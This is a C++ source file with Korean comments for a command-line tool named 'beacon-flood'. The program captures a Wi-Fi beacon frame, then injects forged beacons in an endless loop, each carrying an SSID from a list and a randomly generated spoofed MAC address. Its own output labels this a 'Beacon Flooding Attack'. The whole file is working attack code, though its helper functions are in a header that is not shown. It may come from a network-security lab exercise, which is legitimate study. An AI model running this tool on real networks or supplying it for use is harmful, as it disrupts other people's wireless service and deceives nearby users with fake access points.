#include "utils.h"
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <chrono>
#include <thread>
#include <iomanip>
#include <sstream>
#include <random>
#include <unordered_map>

#include <net/ethernet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <unistd.h>
#include <sys/ioctl.h>

// 주어진 인터페이스에 대해 raw socket 생성
int openRawSocket(const std::string &iface) {
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("socket");
        return -1;
    }
    struct ifreq ifr;
    std::strncpy(ifr.ifr_name, iface.c_str(), sizeof(ifr.ifr_name));
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sockfd);
        return -1;
    }
    struct sockaddr_ll sll;
    std::memset(&sll, 0, sizeof(sll));
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(sockfd, reinterpret_cast<struct sockaddr*>(&sll), sizeof(sll)) < 0) {
        perror("bind");
        close(sockfd);
        return -1;
    }
    return sockfd;
}

// ssid-list 파일을 읽어 각 줄의 SSID를 ssidList 벡터에 저장
bool readSSIDList(const std::string &filename, std::vector<std::string> &ssidList) {
    std::ifstream infile(filename);
    if (!infile) {
        std::cerr << "SSID 리스트 파일을 열 수 없습니다: " << filename << "\n";
        return false;
    }
    std::string line;
    while (std::getline(infile, line)) {
        std::istringstream iss(line);
        std::string ssid;
        if (!(iss >> ssid))
            continue;
        ssidList.push_back(ssid);
    }
    return true;
}

// 랜덤 MAC 주소를 생성한다.
// 로컬 관리 MAC (첫 옥텟: 0x02)로 설정하며 나머지 5바이트를 랜덤 생성한다.
std::string generateRandomMacAddress() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 255);

    unsigned int mac[6];
    mac[0] = 0x02;  // 로컬 관리, unicast
    for (int i = 1; i < 6; i++) {
        mac[i] = dist(gen);
    }
    std::ostringstream oss;
    for (int i = 0; i < 6; i++) {
        oss << std::hex << std::setw(2) << std::setfill('0') << mac[i];
        if (i < 5)
            oss << ":";
    }
    return oss.str();
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Syntax: beacon-flood <interface> <ssid-list-file>\n";
        std::cerr << "예: beacon-flood mon0 ssid-list.txt\n";
        return EXIT_FAILURE;
    }
    std::string iface = argv[1];
    std::string ssidFile = argv[2];

    // SSID 리스트 읽기
    std::vector<std::string> ssidList;
    if (!readSSIDList(ssidFile, ssidList)) {
        return EXIT_FAILURE;
    }
    if (ssidList.empty()) {
        std::cerr << "SSID 리스트가 비어있습니다.\n";
        return EXIT_FAILURE;
    }
    std::cout << "총 " << ssidList.size() << " 개의 SSID를 로드하였습니다.\n";

    // 각 SSID마다 고유의 랜덤 MAC 주소를 한 번 생성하여 저장
    std::unordered_map<std::string, std::string> ssidMacMap;
    for (const auto &ssid : ssidList) {
        ssidMacMap[ssid] = generateRandomMacAddress();
        std::cout << "SSID \"" << ssid << "\" 에 할당된 MAC: " << ssidMacMap[ssid] << "\n";
    }

    // 지정된 인터페이스에서 Beacon 패킷 캡처
    std::vector<uint8_t> beaconPacket;
    if (!captureBeaconPacket(iface, beaconPacket)) {
        std::cerr << "Beacon 패킷 캡처 실패.\n";
        return EXIT_FAILURE;
    }

    // 동일 인터페이스로 raw socket 생성
    int sockfd = openRawSocket(iface);
    if (sockfd < 0) {
        return EXIT_FAILURE;
    }
    std::cout << "Beacon Flooding Attack 시작 (인터페이스: " << iface << ")\n";

    // SSID 리스트 순회하며 Beacon 패킷 전송 (각 SSID에 대해 미리 할당된 MAC 사용)
    size_t ssidIndex = 0;
    while (true) {
        std::vector<uint8_t> txPacket = beaconPacket;
        const std::string &newSSID = ssidList[ssidIndex];
        // 미리 할당된 랜덤 MAC 주소
        std::string newMac = ssidMacMap[newSSID];

        // SA와 BSSID를 동일한 값(newMac)으로 설정
        if (!replaceBssidAndSa(txPacket, newMac)) {
            std::cerr << "MAC (BSSID/SA) 교체 실패 (" << newMac << ").\n";
        }
        // SSID 교체
        if (!replaceSSID(txPacket, newSSID)) {
            std::cerr << "SSID 교체 실패 (" << newSSID << "). 다음 SSID로 진행합니다.\n";
        } else {
            std::cout << "전송: SSID = " << newSSID << ", MAC = " << newMac << "\n";
            ssize_t sent = send(sockfd, txPacket.data(), txPacket.size(), 0);
            if (sent < 0)
                perror("send");
        }
        ssidIndex = (ssidIndex + 1) % ssidList.size();
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    close(sockfd);
    return EXIT_SUCCESS;
}
